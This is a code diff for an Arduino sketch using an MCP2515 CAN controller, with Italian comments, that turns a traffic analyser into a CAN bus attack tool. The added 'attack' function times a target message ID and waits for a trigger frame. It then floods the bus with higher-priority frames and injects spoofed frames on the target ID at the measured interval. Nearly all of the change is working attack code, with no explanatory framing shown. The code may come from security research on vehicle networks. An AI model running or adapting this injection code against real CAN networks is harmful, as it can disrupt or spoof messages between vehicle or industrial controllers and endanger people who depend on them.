@@ -10,7 +10,6 @@ MCP_CAN CAN(SPI_CS_PIN);
  */
 
 void setup() {
-  //pinMode(3, OUTPUT);
   Serial.begin(9600);
   // Initialize MCP2515 running at 16MHz with a baudrate of 500kb/s and the masks and filters disabled.
   if (CAN.begin(MCP_ANY, CAN_500KBPS, MCP_16MHZ) == CAN_OK) {
@@ -27,26 +26,70 @@ byte len = 0;
 unsigned char buf[8];
 
 
-long interval = 0, prev_interval = 0;
-long sum_interval = 0;
-int count = 0, max_count = 1000;
-
 bool done = false;
 
 void loop() {
-  // Read data: len = data length, buf = data byte(s)
-  if (!done) {
-    analyzePacketFreq(0x11);
-    done = true;
+  // Switch between attack or sniff
+  if (true) {
+    if (!done) {
+      int id = 0x11;//0x11
+      long freq = analyzePacketFreq(id, 1000);
+      attack(id, freq);
+      done = true;
+    }
+  } else {
+    packetSniff();
   }
-
-  //packetSniff();
 }
 
-void analyzePacketFreq(unsigned long id) {
-  count = 0;
-  prev_interval = 0;
-  sum_interval = 0;
+void attack(unsigned long id, int frequency) {
+  while (true) {
+    // Prova a settare una maschera
+    if (CAN_MSGAVAIL == CAN.checkReceive() && CAN_OK == CAN.readMsgBuf(&rxId, &len, buf)) {
+      if ((rxId & 0x40000000) == 0x40000000) {
+        Serial.println("REMOTE REQUEST FRAME");
+      } else if (rxId == 0x09) {
+        Serial.print("Attack packet with ID: 0x");
+        Serial.print(id < 16 ? "0" : "");
+        Serial.print(id, HEX);
+        Serial.print(", with frequency: ");
+        Serial.print(frequency);
+        Serial.println(" ms");
+        // Imposta il preceded ID
+        //delay(frequency/2);
+        unsigned char data[] = { 'X' };
+        for(int i = 0; i < 10000; i++) {
+          sendMessage(id - 1, 1, data);
+          sendMessage(id - 1, 1, data);
+        }
+        while (true) {
+          sendMessage(id, 0, {});
+          delay(frequency);
+        }
+      }
+    }
+  }
+}
+
+void sendMessage(unsigned long id, byte len, unsigned char* buf) {
+  byte res = CAN.sendMsgBuf(id, len, buf);
+  if (res != CAN_OK) {
+    Serial.print("Error sending message 0x");
+    Serial.print(id < 16 ? "0" : "");
+    Serial.print(id, HEX);
+  }
+  if (res == CAN_GETTXBFTIMEOUT) {
+    Serial.println(", get TX buff time out!");
+  } else if (res == CAN_SENDMSGTIMEOUT) {
+    Serial.println(", send msg timeout!");
+  }
+}
+
+long analyzePacketFreq(unsigned long id, int max_count) {
+  Serial.println("Start analyze packet...");
+  int count = 0;
+  long interval = 0, prev_interval = 0;
+  long sum_interval = 0;
   while (count < max_count) {
     if (CAN_MSGAVAIL == CAN.checkReceive() && CAN_OK == CAN.readMsgBuf(&rxId, &len, buf)) {
       if (rxId == id && (rxId & 0x40000000) != 0x40000000) {
@@ -65,6 +108,7 @@ void analyzePacketFreq(unsigned long id) {
   Serial.print(" sent every ");
   Serial.print(delta);
   Serial.println(" ms");
+  return delta;
 }
 
 void packetSniff() {
@@ -73,10 +117,10 @@ void packetSniff() {
       if ((rxId & 0x40000000) == 0x40000000) {
         Serial.println("REMOTE REQUEST FRAME");
       } else {
-        Serial.print("ID: ");
-        Serial.print(rxId);
-        Serial.print("\t");
-        Serial.print("DLC: ");
+        Serial.print("ID: 0x");
+        Serial.print(rxId < 16 ? "0" : "");
+        Serial.print(rxId, HEX);
+        Serial.print("\tDLC: ");
         Serial.print(len);
         Serial.print("\t");
         for (byte i = 0; i < len; i++) {
